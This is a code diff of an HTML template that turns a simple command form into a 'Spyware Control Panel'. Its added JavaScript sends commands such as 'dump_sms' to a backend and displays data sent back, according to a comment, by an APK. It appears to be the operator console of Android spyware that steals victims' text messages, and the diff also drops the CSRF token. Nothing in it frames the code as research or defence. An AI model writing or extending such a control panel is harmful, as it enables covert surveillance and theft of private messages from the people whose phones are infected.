@@ -1,15 +1,47 @@
+<!-- index.html -->
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Send Command</title>
+    <title>Spyware Control Panel</title>
+    <script>
+        function sendCommand(command) {
+            fetch('/send_command/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'command': command
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert('Command sent successfully!');
+                } else {
+                    alert('Failed to send command.');
+                }
+            });
+        }
+
+        function fetchData() {
+            fetch('/receive_data/').then(response => response.json()).then(data => {
+                const dataList = document.getElementById('dataList');
+                dataList.innerHTML = '';
+                data.forEach(item => {
+                    const li = document.createElement('li');
+                    li.textContent = item;
+                    dataList.appendChild(li);
+                });
+            });
+        }
+    </script>
 </head>
 <body>
-    <h1>Send Command to Payload</h1>
-    <form action="/send_command/" method="post">
-        {% csrf_token %}
-        <label for="command">Command:</label>
-        <input type="text" id="command" name="command" required>
-        <button type="submit">Send Command</button>
-    </form>
+    <h1>Spyware Control Panel</h1>
+    <button onclick="sendCommand('dump_sms')">SMS Dump</button>
+    <h2>Data Received:</h2>
+    <ul id="dataList">
+        <!-- Data from the APK will be displayed here -->
+    </ul>
 </body>
 </html>
